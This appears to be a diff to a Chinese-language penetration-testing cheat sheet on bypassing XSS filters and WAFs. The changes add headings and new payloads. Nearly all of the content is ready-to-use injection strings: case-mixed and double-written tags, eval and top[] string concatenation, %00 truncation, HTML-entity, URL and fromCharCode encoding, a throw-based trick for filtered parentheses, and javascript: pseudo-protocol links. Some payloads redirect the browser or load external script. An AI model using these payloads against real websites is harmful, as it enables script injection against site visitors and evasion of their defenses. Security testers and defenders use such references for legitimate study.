@@ -111,54 +111,71 @@
 
 ---
 
-## 绕过方法
+# Bypass
 
 1. 使用无害的 payload,类似`<b>,<i>,<u>`观察响应,判断应用程序是否被 HTML 编码,是否标签被过滤,是否过滤 `<>` 等等;
 2. 如果过滤闭合标签,尝试无闭合标签的 payload `<b,<i,<marquee` 观察响应;
 
+## 长度限制
 
 **绕过长度限制**
-```html
+```js
 "onclick=alert(1)//
 "><!--
 --><script>alert(xss);<script>
 ```
 
-**过滤空格,用/代替空格**
-```html
+## 内容检测
+
+**换行**
+```js
+<img src=1
+onerror
+=alert(1)
+```
+
+**过滤空格,用 / 代替空格**
+```js
 <img/src="x"/onerror=alert("xss");>
 ```
 
 **过滤关键字,大小写绕过**
-```html
+```js
 <ImG sRc=x onerRor=alert("xss");>
 <scRiPt>alert(1);</scrIPt>
 ```
 
+**拼接**
+```js
+<details open ontoggle=top['al'%2B'ert'](1) >
+```
+
 **双写关键字**
-```html
+
 有些 waf 可能会只替换一次且是替换为空,这种情况下我们可以考虑双写关键字绕过
+```js
 <imimgg srsrcc=x onerror=alert("xss");>
 ```
 
 **替换绕过**
+
 过滤 alert 用 prompt,confirm,top['alert'](1) 代替绕过
 过滤 () 用 ``代替绕过
 过滤空格 用 %0a(换行符),%0d(回车符),/**/ 代替绕过
 小写转大写情况下 字符 ſ 大写后为 S(ſ 不等于 s)
 
 **利用 eval**
-```html
+```js
 <img src="x" onerror="a=`aler`;b=`t`;c='(`xss`);';eval(a+b+c)">
 ```
 
 **利用 top**
-```html
+```js
 <script>top["al"+"ert"](`xss`);</script>
 ```
 
 **%00截断绕过**
-```html
+```js
 <a href=javascr%00ipt:alert(1)>xss</a>
 ```
 
@@ -167,14 +184,14 @@
 有的 waf 可能是用正则表达式去检测是否有 xss 攻击,如果我们能 fuzz 出正则的规则,则我们就可以使用其它字符去混淆我们注入的代码了,举几个简单的例子
 
 可利用注释、标签的优先级等
-```html
+```js
 <<script>alert("xss");//<</script>
 <title><img src=</title>><img src=x onerror="alert(`xss`);"> //因为 title 标签的优先级比 img 的高,所以会先闭合 title,从而导致前面的 img 标签无效
 <SCRIPT>var a="\\";alert("xss");//";</SCRIPT>
 ```
 
 **编码绕过**
-```html
+```js
 实体编码
 javascrip&#x74;:alert(1) 十六进制
 javascrip&#116;:alert(1) 十进制
@@ -205,17 +222,20 @@ base64绕过
 ```
 
 **过滤双引号,单引号**
-```html
+
+```js
 1.如果是html标签中,我们可以不用引号.如果是在js中,我们可以用反引号代替单双引号
 <img src="x" onerror=alert(`xss`);>
 2.使用编码绕过,具体看上面我列举的例子,我就不多赘述了
 ```
-```html
+
+```js
 过滤括号
 当括号被过滤的时候可以使用throw来绕过
 <svg/onload="window.onerror=eval;throw'=alert\x281\x29';">
 ```
-```html
+
+```js
 过滤url地址
 使用url编码
 <img src="x" onerror=document.location=`http://%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d/`>
@@ -240,20 +260,16 @@ base64绕过
 如果你在你在域名中输入中文句号浏览器会自动转化成英文的逗号
 <img src="x" onerror="document.location=`http://www.baidu.com`">//会自动跳转到百度
 ```
+
 ```js
 fromCharCode方法绕过
 String.fromCharCode(97, 108, 101, 114, 116, 40, 34, 88, 83, 83, 34, 41, 59)
 eval(FromCharCode(97,108,101,114,116,40,39,120,115,115,39,41))
 ```
 
-**javascript伪协议绕过**
+**javascript 伪协议绕过**
 
 无法闭合双引号的情况下,就无法使用 onclick 等事件,只能伪协议绕过,或者调用外部 js
-```js
-换行绕过正则匹配
-onmousedown
-=alert(1)
-```
 ```js
 注释符
 // 单行注释
@@ -265,6 +281,7 @@ onmousedown
 /* */ 多行注释
 有时还可以利用浏览器的容错性,不需要注释
 ```
+
 ```js
 闭合标签空格绕过
 </style ><script>alert(1)</script>
@@ -275,10 +292,12 @@ onmousedown
 例如:https://www.segmentfault.com@xss.haozi.me/j.js
 其实访问的是 @ 后面的内容
 ```
+
 ```
 ") 逃逸函数后接分号
 例:");alert(1)//
 ```
+
 ```
 绕过转义限制
 例:
@@ -288,7 +307,7 @@ alert(1) //
 
 **输入会被大写化**
 
-先把纯文本字符转换为HTML实体字符,然后对其进行URL编码,最后用SVG标记的onload参数输出
+先把纯文本字符转换为 HTML 实体字符, 然后对其进行 URL 编码, 最后用 SVG 标记的 onload 参数输出
 ```html
 <svg onload=%26%23x61%3B%26%23x6C%3B%26%23x65%3B%26%23x72%3B%26%23x74%3B%26%23x28%3B%26%23x27%3B%26%23x48%3B%26%23x69%3B%26%23x20%3B%26%23x4D%3B%26%23x6F%3B%26%23x6D%3B%26%23x27%3B%26%23x29%3B>
 ```
